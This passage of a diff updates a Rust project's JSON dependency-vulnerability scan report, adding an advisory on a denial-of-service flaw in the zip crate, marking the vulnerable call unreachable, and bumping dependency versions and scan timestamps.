check.\n\nUpload handling, mail-attachment processing, package and artefact ingestion, backup restore and container-image layer extraction all match this pattern. No confidentiality or integrity property is affected: no memory unsafety, no out-of-bounds access, no disclosure and no data corruption.\n\n### Suggested remediation\n\nBefore allocating, compare `file.size()` with a documented, platform-appropriate maximum symlink-target length and reject entries that exceed it. Alternatively, replace `Vec::with_capacity()` with fallible `try_reserve()` and return an I/O error when allocation fails. Do not use Linux's `PATH_MAX` as a cross-platform contract.\n\nApply the allocation fix to `src/read/stream.rs` as defence-in-depth, although its symlink path is currently unreachable because streaming entries have no symlink attributes.\n\nFor reference, the crate already applies exactly this defence to another untrusted size on the same path: `ZipArchive::new()` clamps a suspicious `number_of_files` to zero and explicitly rejects an oversized central directory before reserving ([`src/read/zip_archive.rs#L185-L202`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/zip_archive.rs#L185-L202)). The symlink branch received neither guard. A survey of `Vec::with_capacity` across `src/` finds exactly two sites sized from untrusted input: `src/read/mod.rs:401` and `src/read/stream.rs:73`.",
+            "epss_scores": [
+              0.00461,
+              0.39782
+            ],
+            "severity": "high",
+            "source": "github",
+            "vulnerable_functions": []
+          },
+          {
+            "cvss_scores": [
+              7.5
+            ],
+            "cvss_vectors": [
+              "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+            ],
+            "details": "zip is a zip library for Rust that supports reading and writing simple ZIP files. From 1.3.0 until 9.0.0, ZipArchive::extract in src/read/mod.rs calls Vec::with_capacity for a symbolic link target using the attacker-controlled ZIP64 uncompressed_size before reading entry data. A small archive can request an impossible capacity, causing the infallible allocation path to abort the process before the entry is validated. The failure cannot be contained with catch_unwind or a worker thread, allowing repeated denial of service in archive-processing applications. This issue is fixed in version 9.0.0.",
+            "epss_scores": [],
+            "severity": "high",
+            "source": "nvd",
+            "vulnerable_functions": []
+          },
+          {
+            "cvss_scores": [
+              7.5
+            ],
+            "cvss_vectors": [
+              "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+            ],
+            "details": "",
+            "epss_scores": [],
+            "severity": "high",
+            "source": "osv",
+            "vulnerable_functions": []
+          }
+        ],
+        "fixed_versions": [
+          "9.0.0"
+        ],
+        "id": "RUSTSEC-2026-0429",
+        "modified": "2026-11-02T10:10:53.649189132Z",
+        "references": [
+          "https://crates.io/crates/zip",
+          "https://github.com/advisories/GHSA-q7v9-x93c-xqv3",
+          "https://github.com/zip-rs/zip2",
+          "https://github.com/zip-rs/zip2/commit/a543a1fc8f3f3eef36f27bb137230295284cdb98",
+          "https://github.com/zip-rs/zip2/pull/984",
+          "https://github.com/zip-rs/zip2/releases/tag/v9.0.0",
+          "https://github.com/zip-rs/zip2/security/advisories/GHSA-q7v9-x93c-xqv3",
+          "https://nvd.nist.gov/vuln/detail/CVE-2026-115909",
+          "https://rustsec.org/advisories/RUSTSEC-2026-0429.html"
+        ],
+        "severity": "high",
+        "source": "cargo-audit;osv",
+        "withdrawn": false
+      },
+      "kev": false,
+      "package": {
+        "bom_ref": null,
+        "direct": true,
+        "ecosystem": "crates.io",
+        "name": "zip",
+        "purl": "pkg:cargo/zip@6.0.0",
+        "scope": "runtime",
+        "version": "6.0.0"
+      },
+      "reachability": "unreachable",
+      "reachability_evidence": [
+        ".security/risk-acceptance/evidence/2026-11-cargo-reachability.txt#zip-api-call-sites (no extract() call site)"
+      ]
     }
   ],
   "gate_status": "warnings",
@@ -1236,7 +1758,7 @@
       ],
       [
         "pkg:cargo/async-compression@0.4.43",
-        "pkg:cargo/tokio@1.53.1"
+        "pkg:cargo/tokio@1.53.3"
       ],
       [
         "pkg:cargo/async-trait@0.1.91",
@@ -1255,31 +1777,31 @@
         "pkg:cargo/critical-section@1.2.0"
       ],
       [
-        "pkg:cargo/aws-lc-rs@1.17.3",
-        "pkg:cargo/aws-lc-sys@0.43.0"
+        "pkg:cargo/aws-lc-rs@1.19.0",
+        "pkg:cargo/aws-lc-sys@0.47.0"
       ],
       [
-        "pkg:cargo/aws-lc-rs@1.17.3",
+        "pkg:cargo/aws-lc-rs@1.19.0",
         "pkg:cargo/zeroize@1.9.0"
       ],
       [
-        "pkg:cargo/aws-lc-sys@0.43.0",
+        "pkg:cargo/aws-lc-sys@0.47.0",
         "pkg:cargo/cc@1.4.0"
       ],
       [
-        "pkg:cargo/aws-lc-sys@0.43.0",
+        "pkg:cargo/aws-lc-sys@0.47.0",
         "pkg:cargo/cmake@0.1.58"
       ],
       [
-        "pkg:cargo/aws-lc-sys@0.43.0",
+        "pkg:cargo/aws-lc-sys@0.47.0",
         "pkg:cargo/dunce@1.0.5"
       ],
       [
-        "pkg:cargo/aws-lc-sys@0.43.0",
+        "pkg:cargo/aws-lc-sys@0.47.0",
         "pkg:cargo/fs_extra@1.3.0"
       ],
       [
-        "pkg:cargo/aws-lc-sys@0.43.0",
+        "pkg:cargo/aws-lc-sys@0.47.0",
         "pkg:cargo/pkg-config@0.3.33"
       ],
       [
@@ -1408,7 +1930,7 @@
       ],
       [
         "pkg:cargo/axum@0.8.9",
-        "pkg:cargo/tokio@1.53.1"
+        "pkg:cargo/tokio@1.53.3"
       ],
       [
         "pkg:cargo/axum@0.8.9",
@@ -2095,47 +2617,47 @@
         "pkg:cargo/zip@6.0.0"
       ],
       [
-        "pkg:cargo/h2@0.4.15",
+        "pkg:cargo/h2@0.4.16",
         "pkg:cargo/atomic-waker@1.1.2"
       ],
       [
-        "pkg:cargo/h2@0.4.15",
+        "pkg:cargo/h2@0.4.16",
         "pkg:cargo/bytes@1.12.1"
       ],
       [
-        "pkg:cargo/h2@0.4.15",
+        "pkg:cargo/h2@0.4.16",
         "pkg:cargo/fnv@1.0.7"
       ],
       [
-        "pkg:cargo/h2@0.4.15",
+        "pkg:cargo/h2@0.4.16",
         "pkg:cargo/futures-core@0.3.33"
       ],
       [
-        "pkg:cargo/h2@0.4.15",
+        "pkg:cargo/h2@0.4.16",
         "pkg:cargo/futures-sink@0.3.33"
       ],
       [
-        "pkg:cargo/h2@0.4.15",
+        "pkg:cargo/h2@0.4.16",
         "pkg:cargo/http@1.5.0"
       ],
       [
-        "pkg:cargo/h2@0.4.15",
+        "pkg:cargo/h2@0.4.16",
         "pkg:cargo/indexmap@2.14.0"
       ],
       [
-        "pkg:cargo/h2@0.4.15",
+        "pkg:cargo/h2@0.4.16",
         "pkg:cargo/slab@0.4.12"
       ],
       [
-        "pkg:cargo/h2@0.4.15",
+        "pkg:cargo/h2@0.4.16",
         "pkg:cargo/tokio-util@0.7.19"
       ],
       [
-        "pkg:cargo/h2@0.4.15",
-        "pkg:cargo/tokio@1.53.1"
+        "pkg:cargo/h2@0.4.16",
+        "pkg:cargo/tokio@1.53.3"
       ],
       [
-        "pkg:cargo/h2@0.4.15",
+        "pkg:cargo/h2@0.4.16",
         "pkg:cargo/tracing@0.1.44"
       ],
       [
@@ -2272,7 +2794,7 @@
       ],
       [
         "pkg:cargo/hyper-rustls@0.27.9",
-        "pkg:cargo/rustls@0.23.43"
+        "pkg:cargo/rustls@0.23.46"
       ],
       [
         "pkg:cargo/hyper-rustls@0.27.9",
@@ -2280,7 +2802,7 @@
       ],
       [
         "pkg:cargo/hyper-rustls@0.27.9",
-        "pkg:cargo/tokio@1.53.1"
+        "pkg:cargo/tokio@1.53.3"
       ],
       [
         "pkg:cargo/hyper-rustls@0.27.9",
@@ -2312,7 +2834,7 @@
       ],
       [
         "pkg:cargo/hyper-tls@0.6.0",
-        "pkg:cargo/tokio@1.53.1"
+        "pkg:cargo/tokio@1.53.3"
       ],
       [
         "pkg:cargo/hyper-tls@0.6.0",
@@ -2372,7 +2894,7 @@
       ],
       [
         "pkg:cargo/hyper-util@0.1.20",
-        "pkg:cargo/tokio@1.53.1"
+        "pkg:cargo/tokio@1.53.3"
       ],
       [
         "pkg:cargo/hyper-util@0.1.20",
@@ -2404,7 +2926,7 @@
       ],
       [
         "pkg:cargo/hyper@1.11.0",
-        "pkg:cargo/h2@0.4.15"
+        "pkg:cargo/h2@0.4.16"
       ],
       [
         "pkg:cargo/hyper@1.11.0",
@@ -2436,7 +2958,7 @@
       ],
       [
         "pkg:cargo/hyper@1.11.0",
-        "pkg:cargo/tokio@1.53.1"
+        "pkg:cargo/tokio@1.53.3"
       ],
       [
         "pkg:cargo/hyper@1.11.0",
@@ -3103,63 +3625,63 @@
         "pkg:cargo/psl-types@2.0.11"
       ],
       [
-        "pkg:cargo/quinn-proto@0.11.16",
-        "pkg:cargo/aws-lc-rs@1.17.3"
+        "pkg:cargo/quinn-proto@0.11.18",
+        "pkg:cargo/aws-lc-rs@1.19.0"
       ],
       [
-        "pkg:cargo/quinn-proto@0.11.16",
+        "pkg:cargo/quinn-proto@0.11.18",
         "pkg:cargo/bytes@1.12.1"
       ],
       [
-        "pkg:cargo/quinn-proto@0.11.16",
+        "pkg:cargo/quinn-proto@0.11.18",
         "pkg:cargo/getrandom@0.4.3"
       ],
       [
-        "pkg:cargo/quinn-proto@0.11.16",
+        "pkg:cargo/quinn-proto@0.11.18",
         "pkg:cargo/lru-slab@0.1.2"
       ],
       [
-        "pkg:cargo/quinn-proto@0.11.16",
+        "pkg:cargo/quinn-proto@0.11.18",
         "pkg:cargo/rand@0.10.2"
       ],
       [
-        "pkg:cargo/quinn-proto@0.11.16",
+        "pkg:cargo/quinn-proto@0.11.18",
         "pkg:cargo/rand_pcg@0.10.2"
       ],
       [
-        "pkg:cargo/quinn-proto@0.11.16",
+        "pkg:cargo/quinn-proto@0.11.18",
         "pkg:cargo/ring@0.17.14"
       ],
       [
-        "pkg:cargo/quinn-proto@0.11.16",
+        "pkg:cargo/quinn-proto@0.11.18",
         "pkg:cargo/rustc-hash@2.1.3"
       ],
       [
-        "pkg:cargo/quinn-proto@0.11.16",
+        "pkg:cargo/quinn-proto@0.11.18",
         "pkg:cargo/rustls-pki-types@1.15.1"
       ],
       [
-        "pkg:cargo/quinn-proto@0.11.16",
-        "pkg:cargo/rustls@0.23.43"
+        "pkg:cargo/quinn-proto@0.11.18",
+        "pkg:cargo/rustls@0.23.46"
       ],
       [
-        "pkg:cargo/quinn-proto@0.11.16",
+        "pkg:cargo/quinn-proto@0.11.18",
         "pkg:cargo/slab@0.4.12"
       ],
       [
-        "pkg:cargo/quinn-proto@0.11.16",
+        "pkg:cargo/quinn-proto@0.11.18",
         "pkg:cargo/thiserror@2.0.19"
       ],
       [
-        "pkg:cargo/quinn-proto@0.11.16",
+        "pkg:cargo/quinn-proto@0.11.18",
         "pkg:cargo/tinyvec@1.12.0"
       ],
       [
-        "pkg:cargo/quinn-proto@0.11.16",
+        "pkg:cargo/quinn-proto@0.11.18",
         "pkg:cargo/tracing@0.1.44"
       ],
       [
-        "pkg:cargo/quinn-proto@0.11.16",
+        "pkg:cargo/quinn-proto@0.11.18",
         "pkg:cargo/web-time@1.1.0"
       ],
       [
@@ -3200,7 +3722,7 @@
       ],
       [
         "pkg:cargo/quinn@0.11.11",
-        "pkg:cargo/quinn-proto@0.11.16"
+        "pkg:cargo/quinn-proto@0.11.18"
       ],
       [
         "pkg:cargo/quinn@0.11.11",
@@ -3212,7 +3734,7 @@
       ],
       [
         "pkg:cargo/quinn@0.11.11",
-        "pkg:cargo/rustls@0.23.43"
+        "pkg:cargo/rustls@0.23.46"
       ],
       [
         "pkg:cargo/quinn@0.11.11",
@@ -3224,7 +3746,7 @@
       ],
       [
         "pkg:cargo/quinn@0.11.11",
-        "pkg:cargo/tokio@1.53.1"
+        "pkg:cargo/tokio@1.53.3"
       ],
       [
         "pkg:cargo/quinn@0.11.11",
@@ -3352,7 +3874,7 @@
       ],
       [
         "pkg:cargo/reqwest@0.12.28",
-        "pkg:cargo/h2@0.4.15"
+        "pkg:cargo/h2@0.4.16"
       ],
       [
         "pkg:cargo/reqwest@0.12.28",
@@ -3432,7 +3954,7 @@
       ],
       [
         "pkg:cargo/reqwest@0.12.28",
-        "pkg:cargo/tokio@1.53.1"
+        "pkg:cargo/tokio@1.53.3"
       ],
       [
         "pkg:cargo/reqwest@0.12.28",
@@ -3488,7 +4010,7 @@
       ],
       [
         "pkg:cargo/reqwest@0.13.4",
-        "pkg:cargo/h2@0.4.15"
+        "pkg:cargo/h2@0.4.16"
       ],
       [
         "pkg:cargo/reqwest@0.13.4",
@@ -3548,7 +4070,7 @@
       ],
       [
         "pkg:cargo/reqwest@0.13.4",
-        "pkg:cargo/rustls@0.23.43"
+        "pkg:cargo/rustls@0.23.46"
       ],
       [
         "pkg:cargo/reqwest@0.13.4",
@@ -3560,7 +4082,7 @@
       ],
       [
         "pkg:cargo/reqwest@0.13.4",
-        "pkg:cargo/tokio@1.53.1"
+        "pkg:cargo/tokio@1.53.3"
       ],
       [
         "pkg:cargo/reqwest@0.13.4",
@@ -3800,11 +4322,11 @@
       ],
       [
         "pkg:cargo/rustls-platform-verifier@0.7.0",
-        "pkg:cargo/rustls-webpki@0.103.13"
+        "pkg:cargo/rustls-webpki@0.103.16"
       ],
       [
         "pkg:cargo/rustls-platform-verifier@0.7.0",
-        "pkg:cargo/rustls@0.23.43"
+        "pkg:cargo/rustls@0.23.46"
       ],
       [
         "pkg:cargo/rustls-platform-verifier@0.7.0",
@@ -3816,50 +4338,50 @@
       ],
       [
         "pkg:cargo/rustls-platform-verifier@0.7.0",
-        "pkg:cargo/webpki-root-certs@1.0.9"
+        "pkg:cargo/webpki-root-certs@1.0.10"
       ],
       [
         "pkg:cargo/rustls-platform-verifier@0.7.0",
         "pkg:cargo/windows-sys@0.61.2"
       ],
       [
-        "pkg:cargo/rustls-webpki@0.103.13",
-        "pkg:cargo/aws-lc-rs@1.17.3"
+        "pkg:cargo/rustls-webpki@0.103.16",
+        "pkg:cargo/aws-lc-rs@1.19.0"
       ],
       [
-        "pkg:cargo/rustls-webpki@0.103.13",
+        "pkg:cargo/rustls-webpki@0.103.16",
         "pkg:cargo/ring@0.17.14"
       ],
       [
-        "pkg:cargo/rustls-webpki@0.103.13",
+        "pkg:cargo/rustls-webpki@0.103.16",
         "pkg:cargo/rustls-pki-types@1.15.1"
       ],
       [
-        "pkg:cargo/rustls-webpki@0.103.13",
+        "pkg:cargo/rustls-webpki@0.103.16",
         "pkg:cargo/untrusted@0.9.0"
       ],
       [
-        "pkg:cargo/rustls@0.23.43",
-        "pkg:cargo/aws-lc-rs@1.17.3"
+        "pkg:cargo/rustls@0.23.46",
+        "pkg:cargo/aws-lc-rs@1.19.0"
       ],
       [
-        "pkg:cargo/rustls@0.23.43",
+        "pkg:cargo/rustls@0.23.46",
         "pkg:cargo/once_cell@1.21.4"
       ],
       [
-        "pkg:cargo/rustls@0.23.43",
+        "pkg:cargo/rustls@0.23.46",
         "pkg:cargo/rustls-pki-types@1.15.1"
       ],
       [
-        "pkg:cargo/rustls@0.23.43",
-        "pkg:cargo/rustls-webpki@0.103.13"
+        "pkg:cargo/rustls@0.23.46",
+        "pkg:cargo/rustls-webpki@0.103.16"
       ],
       [
-        "pkg:cargo/rustls@0.23.43",
+        "pkg:cargo/rustls@0.23.46",
         "pkg:cargo/subtle@2.6.1"
       ],
       [
-        "pkg:cargo/rustls@0.23.43",
+        "pkg:cargo/rustls@0.23.46",
         "pkg:cargo/zeroize@1.9.0"
       ],
       [
@@ -4384,15 +4906,15 @@
       ],
       [
         "pkg:cargo/tokio-native-tls@0.3.1",
-        "pkg:cargo/tokio@1.53.1"
+        "pkg:cargo/tokio@1.53.3"
       ],
       [
         "pkg:cargo/tokio-rustls@0.26.4",
-        "pkg:cargo/rustls@0.23.43"
+        "pkg:cargo/rustls@0.23.46"
       ],
       [
         "pkg:cargo/tokio-rustls@0.26.4",
-        "pkg:cargo/tokio@1.53.1"
+        "pkg:cargo/tokio@1.53.3"
       ],
       [
         "pkg:cargo/tokio-util@0.7.19",
@@ -4416,38 +4938,38 @@
       ],
       [
         "pkg:cargo/tokio-util@0.7.19",
-        "pkg:cargo/tokio@1.53.1"
+        "pkg:cargo/tokio@1.53.3"
       ],
       [
-        "pkg:cargo/tokio@1.53.1",
+        "pkg:cargo/tokio@1.53.3",
         "pkg:cargo/bytes@1.12.1"
       ],
       [
-        "pkg:cargo/tokio@1.53.1",
+        "pkg:cargo/tokio@1.53.3",
         "pkg:cargo/libc@0.2.189"
       ],
       [
-        "pkg:cargo/tokio@1.53.1",
+        "pkg:cargo/tokio@1.53.3",
         "pkg:cargo/mio@1.2.2"
       ],
       [
-        "pkg:cargo/tokio@1.53.1",
+        "pkg:cargo/tokio@1.53.3",
         "pkg:cargo/pin-project-lite@0.2.17"
       ],
       [
-        "pkg:cargo/tokio@1.53.1",
+        "pkg:cargo/tokio@1.53.3",
         "pkg:cargo/signal-hook-registry@1.4.8"
       ],
       [
-        "pkg:cargo/tokio@1.53.1",
+        "pkg:cargo/tokio@1.53.3",
         "pkg:cargo/socket2@0.6.5"
       ],
       [
-        "pkg:cargo/tokio@1.53.1",
+        "pkg:cargo/tokio@1.53.3",
         "pkg:cargo/tokio-macros@2.7.2"
       ],
       [
-        "pkg:cargo/tokio@1.53.1",
+        "pkg:cargo/tokio@1.53.3",
         "pkg:cargo/windows-sys@0.61.2"
       ],
       [
@@ -4492,7 +5014,7 @@
       ],
       [
         "pkg:cargo/tower-http@0.6.11",
-        "pkg:cargo/tokio@1.53.1"
+        "pkg:cargo/tokio@1.53.3"
       ],
       [
         "pkg:cargo/tower-http@0.6.11",
@@ -4528,7 +5050,7 @@
       ],
       [
         "pkg:cargo/tower@0.5.3",
-        "pkg:cargo/tokio@1.53.1"
+        "pkg:cargo/tokio@1.53.3"
       ],
       [
         "pkg:cargo/tower@0.5.3",
@@ -4719,7 +5241,7 @@
         "pkg:cargo/wasm-bindgen@0.2.126"
       ],
       [
-        "pkg:cargo/webpki-root-certs@1.0.9",
+        "pkg:cargo/webpki-root-certs@1.0.10",
         "pkg:cargo/rustls-pki-types@1.15.1"
       ],
       [
@@ -4963,7 +5485,7 @@
         "pkg:cargo/simd-adler32@0.3.10"
       ]
     ],
-    "fingerprint": "725e38374fc90bc622980a32a3657224e6bf276cb9cbf4e91a787bc1103d3fc8",
+    "fingerprint": "613f04a586eb3b2235046ba81d7d2c757a559c1e8613723c3341546ef34d01fc",
     "incomplete_reasons": [],
     "packages": [
       {
@@ -5124,18 +5646,18 @@
         "direct": false,
         "ecosystem": "crates.io",
         "name": "aws-lc-rs",
-        "purl": "pkg:cargo/aws-lc-rs@1.17.3",
+        "purl": "pkg:cargo/aws-lc-rs@1.19.0",
         "scope": "unknown",
-        "version": "1.17.3"
+        "version": "1.19.0"
       },
       {
         "bom_ref": null,
         "direct": false,
         "ecosystem": "crates.io",
         "name": "aws-lc-sys",
-        "purl": "pkg:cargo/aws-lc-sys@0.43.0",
+        "purl": "pkg:cargo/aws-lc-sys@0.47.0",
         "scope": "unknown",
-        "version": "0.43.0"
+        "version": "0.47.0"
       },
       {
         "bom_ref": null,
@@ -5499,11 +6021,11 @@
       },
       {
         "bom_ref": null,
-        "direct": false,
+        "direct": true,
         "ecosystem": "crates.io",
         "name": "csv",
         "purl": "pkg:cargo/csv@1.4.0",
-        "scope": "unknown",
+        "scope": "runtime",
         "version": "1.4.0"
       },
       {
@@ -5961,9 +6483,9 @@
         "direct": false,
         "ecosystem": "crates.io",
         "name": "h2",
-        "purl": "pkg:cargo/h2@0.4.15",
+        "purl": "pkg:cargo/h2@0.4.16",
         "scope": "unknown",
-        "version": "0.4.15"
+        "version": "0.4.16"
       },
       {
         "bom_ref": null,
@@ -6852,9 +7374,9 @@
         "direct": false,
         "ecosystem": "crates.io",
         "name": "quinn-proto",
-        "purl": "pkg:cargo/quinn-proto@0.11.16",
+        "purl": "pkg:cargo/quinn-proto@0.11.18",
         "scope": "unknown",
-        "version": "0.11.16"
+        "version": "0.11.18"
       },
       {
         "bom_ref": null,
@@ -7140,9 +7662,9 @@
         "direct": false,
         "ecosystem": "crates.io",
         "name": "rustls",
-        "purl": "pkg:cargo/rustls@0.23.43",
+        "purl": "pkg:cargo/rustls@0.23.46",
         "scope": "unknown",
-        "version": "0.23.43"
+        "version": "0.23.46"
       },
       {
         "bom_ref": null,
@@ -7185,9 +7707,9 @@
         "direct": false,
         "ecosystem": "crates.io",
         "name": "rustls-webpki",
-        "purl": "pkg:cargo/rustls-webpki@0.103.13",
+        "purl": "pkg:cargo/rustls-webpki@0.103.16",
         "scope": "unknown",
-        "version": "0.103.13"
+        "version": "0.103.16"
       },
       {
         "bom_ref": null,
@@ -7236,11 +7758,11 @@
       },
       {
         "bom_ref": null,
-        "direct": false,
+        "direct": true,
         "ecosystem": "crates.io",
         "name": "scraper",
         "purl": "pkg:cargo/scraper@0.22.0",
-        "scope": "unknown",
+        "scope": "runtime",
         "version": "0.22.0"
       },
       {
@@ -7698,9 +8220,9 @@
         "direct": true,
         "ecosystem": "crates.io",
         "name": "tokio",
-        "purl": "pkg:cargo/tokio@1.53.1",
+        "purl": "pkg:cargo/tokio@1.53.3",
         "scope": "runtime",
-        "version": "1.53.1"
+        "version": "1.53.3"
       },
       {
         "bom_ref": null,
@@ -8022,9 +8544,9 @@
         "direct": false,
         "ecosystem": "crates.io",
         "name": "webpki-root-certs",
-        "purl": "pkg:cargo/webpki-root-certs@1.0.9",
+        "purl": "pkg:cargo/webpki-root-certs@1.0.10",
         "scope": "unknown",
-        "version": "1.0.9"
+        "version": "1.0.10"
       },
       {
         "bom_ref": null,
@@ -8311,7 +8833,7 @@
         "ecosystem": "crates.io",
         "name": "zip",
         "purl": "pkg:cargo/zip@6.0.0",
-        "scope": "development",
+        "scope": "runtime",
         "version": "6.0.0"
       },
       {
@@ -8344,14 +8866,14 @@
     ],
     "statuses": [
       {
-        "attempted_at": "2026-08-14T20:50:27.736873Z",
+        "attempted_at": "2026-11-07T22:25:32.841822Z",
         "diagnostic": "",
         "provenance": "",
         "source": "cargo-metadata",
         "state": "ok"
       },
       {
-        "attempted_at": "2026-08-14T20:50:27.737896Z",
+        "attempted_at": "2026-11-07T22:25:32.842706Z",
         "diagnostic": "",
         "provenance": "",
         "source": "inventory",
@@ -8360,191 +8882,282 @@
     ]
   },
   "mode": "main",
-  "project_revision": "20f7be7",
+  "project_revision": "088104119f86c09b0073674791fd531115316ab3",
   "schema_version": "1.0",
   "sources": [
     {
-      "attempted_at": "2026-08-14T20:50:32.607900Z",
+      "attempted_at": "2026-11-07T22:25:47.386698Z",
       "diagnostic": "",
       "provenance": "",
       "source": "cargo-audit",
       "state": "ok"
     },
     {
-      "attempted_at": "2026-08-14T20:50:34.139586Z",
+      "attempted_at": "2026-11-07T22:25:49.693813Z",
       "diagnostic": "",
       "provenance": "https://api.github.com/advisories",
       "source": "github",
       "state": "not_applicable"
     },
     {
-      "attempted_at": "2026-08-14T20:50:34.151989Z",
+      "attempted_at": "2026-11-07T22:25:49.710476Z",
       "diagnostic": "",
       "provenance": "https://api.github.com/advisories",
       "source": "github",
       "state": "not_applicable"
     },
     {
-      "attempted_at": "2026-08-14T20:50:34.160073Z",
+      "attempted_at": "2026-11-07T22:25:49.722223Z",
       "diagnostic": "",
       "provenance": "https://api.github.com/advisories",
       "source": "github",
       "state": "not_applicable"
     },
     {
-      "attempted_at": "2026-08-14T20:50:34.160452Z",
+      "attempted_at": "2026-11-07T22:25:49.722692Z",
       "diagnostic": "",
       "provenance": "https://api.github.com/advisories",
       "source": "github",
       "state": "not_applicable"
     },
     {
-      "attempted_at": "2026-08-14T20:50:34.184638Z",
+      "attempted_at": "2026-11-07T22:25:49.760342Z",
       "diagnostic": "",
       "provenance": "https://api.github.com/advisories",
       "source": "github",
       "state": "not_applicable"
     },
     {
-      "attempted_at": "2026-08-14T20:50:35.062137Z",
+      "attempted_at": "2026-11-07T22:25:50.703790Z",
       "diagnostic": "",
       "provenance": "https://api.github.com/advisories",
       "source": "github",
       "state": "not_applicable"
     },
     {
-      "attempted_at": "2026-08-14T20:50:34.631776Z",
-      "diagnostic": "GitHub CVSS metric is invalid",
+      "attempted_at": "2026-11-07T22:25:50.225696Z",
+      "diagnostic": "",
       "provenance": "https://api.github.com/advisories",
       "source": "github",
-      "state": "partial"
+      "state": "ok"
     },
     {
-      "attempted_at": "2026-08-14T20:50:35.061180Z",
-      "diagnostic": "GitHub CVSS metric is invalid",
+      "attempted_at": "2026-11-07T22:25:50.703402Z",
+      "diagnostic": "",
       "provenance": "https://api.github.com/advisories",
       "source": "github",
-      "state": "partial"
+      "state": "ok"
     },
     {
-      "attempted_at": "2026-08-14T20:50:35.968178Z",
-      "diagnostic": "GitHub CVSS metric is invalid",
+      "attempted_at": "2026-11-07T22:25:51.350053Z",
+      "diagnostic": "",
       "provenance": "https://api.github.com/advisories",
       "source": "github",
-      "state": "partial"
+      "state": "ok"
     },
     {
-      "attempted_at": "2026-08-14T20:50:38.837267Z",
-      "diagnostic": "GitHub CVSS metric is invalid",
+      "attempted_at": "2026-11-07T22:25:52.611207Z",
+      "diagnostic": "",
       "provenance": "https://api.github.com/advisories",
       "source": "github",
-      "state": "partial"
+      "state": "ok"
     },
     {
-      "attempted_at": "2026-08-14T20:50:32.607917Z",
+      "attempted_at": "2026-11-07T22:25:53.603236Z",
+      "diagnostic": "",
+      "provenance": "https://api.github.com/advisories",
+      "source": "github",
+      "state": "ok"
+    },
+    {
+      "attempted_at": "2026-11-07T22:25:54.749058Z",
+      "diagnostic": "",
+      "provenance": "https://api.github.com/advisories",
+      "source": "github",
+      "state": "ok"
+    },
+    {
+      "attempted_at": "2026-11-07T22:25:55.317984Z",
+      "diagnostic": "",
+      "provenance": "https://api.github.com/advisories",
+      "source": "github",
+      "state": "ok"
+    },
+    {
+      "attempted_at": "2026-11-07T22:25:55.886180Z",
+      "diagnostic": "",
+      "provenance": "https://api.github.com/advisories",
+      "source": "github",
+      "state": "ok"
+    },
+    {
+      "attempted_at": "2026-11-07T22:25:56.184911Z",
+      "diagnostic": "",
+      "provenance": "https://api.github.com/advisories",
+      "source": "github",
+      "state": "ok"
+    },
+    {
+      "attempted_at": "2026-11-07T22:25:56.664664Z",
+      "diagnostic": "",
+      "provenance": "https://api.github.com/advisories",
+      "source": "github",
+      "state": "ok"
+    },
+    {
+      "attempted_at": "2026-11-07T22:25:47.386717Z",
       "diagnostic": "ecosystem not present",
       "provenance": "",
       "source": "govulncheck",
       "state": "not_applicable"
     },
     {
-      "attempted_at": "2026-08-14T20:50:34.133798Z",
+      "attempted_at": "2026-11-07T22:25:49.686141Z",
       "diagnostic": "",
       "provenance": "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json",
       "source": "kev",
       "state": "ok"
     },
     {
-      "attempted_at": "2026-08-14T20:50:31.532681Z",
+      "attempted_at": "2026-11-07T22:25:45.673616Z",
       "diagnostic": "ecosystem not present",
       "provenance": "",
       "source": "npm-audit",
       "state": "not_applicable"
     },
     {
-      "attempted_at": "2026-08-14T20:50:34.139677Z",
+      "attempted_at": "2026-11-07T22:25:49.693862Z",
       "diagnostic": "",
       "provenance": "https://services.nvd.nist.gov/rest/json/cves/2.0",
       "source": "nvd",
       "state": "not_applicable"
     },
     {
-      "attempted_at": "2026-08-14T20:50:34.152051Z",
+      "attempted_at": "2026-11-07T22:25:49.710503Z",
       "diagnostic": "",
       "provenance": "https://services.nvd.nist.gov/rest/json/cves/2.0",
       "source": "nvd",
       "state": "not_applicable"
     },
     {
-      "attempted_at": "2026-08-14T20:50:34.160102Z",
+      "attempted_at": "2026-11-07T22:25:49.722259Z",
       "diagnostic": "",
       "provenance": "https://services.nvd.nist.gov/rest/json/cves/2.0",
       "source": "nvd",
       "state": "not_applicable"
     },
     {
-      "attempted_at": "2026-08-14T20:50:34.160469Z",
+      "attempted_at": "2026-11-07T22:25:49.722706Z",
       "diagnostic": "",
       "provenance": "https://services.nvd.nist.gov/rest/json/cves/2.0",
       "source": "nvd",
       "state": "not_applicable"
     },
     {
-      "attempted_at": "2026-08-14T20:50:34.184674Z",
+      "attempted_at": "2026-11-07T22:25:49.760371Z",
       "diagnostic": "",
       "provenance": "https://services.nvd.nist.gov/rest/json/cves/2.0",
       "source": "nvd",
       "state": "not_applicable"
     },
     {
-      "attempted_at": "2026-08-14T20:50:34.631971Z",
+      "attempted_at": "2026-11-07T22:25:50.225774Z",
       "diagnostic": "",
       "provenance": "https://services.nvd.nist.gov/rest/json/cves/2.0",
       "source": "nvd",
       "state": "not_applicable"
     },
     {
-      "attempted_at": "2026-08-14T20:50:35.061439Z",
+      "attempted_at": "2026-11-07T22:25:50.703507Z",
       "diagnostic": "",
       "provenance": "https://services.nvd.nist.gov/rest/json/cves/2.0",
       "source": "nvd",
       "state": "not_applicable"
     },
     {
-      "attempted_at": "2026-08-14T20:50:35.062187Z",
+      "attempted_at": "2026-11-07T22:25:50.703810Z",
       "diagnostic": "",
       "provenance": "https://services.nvd.nist.gov/rest/json/cves/2.0",
       "source": "nvd",
       "state": "not_applicable"
     },
     {
-      "attempted_at": "2026-08-14T20:50:38.018019Z",
+      "attempted_at": "2026-11-07T22:25:55.318032Z",
+      "diagnostic": "",
+      "provenance": "https://services.nvd.nist.gov/rest/json/cves/2.0",
+      "source": "nvd",
+      "state": "not_applicable"
+    },
+    {
+      "attempted_at": "2026-11-07T22:25:55.886238Z",
+      "diagnostic": "",
+      "provenance": "https://services.nvd.nist.gov/rest/json/cves/2.0",
+      "source": "nvd",
+      "state": "not_applicable"
+    },
+    {
+      "attempted_at": "2026-11-07T22:25:56.184978Z",
+      "diagnostic": "",
+      "provenance": "https://services.nvd.nist.gov/rest/json/cves/2.0",
+      "source": "nvd",
+      "state": "not_applicable"
+    },
+    {
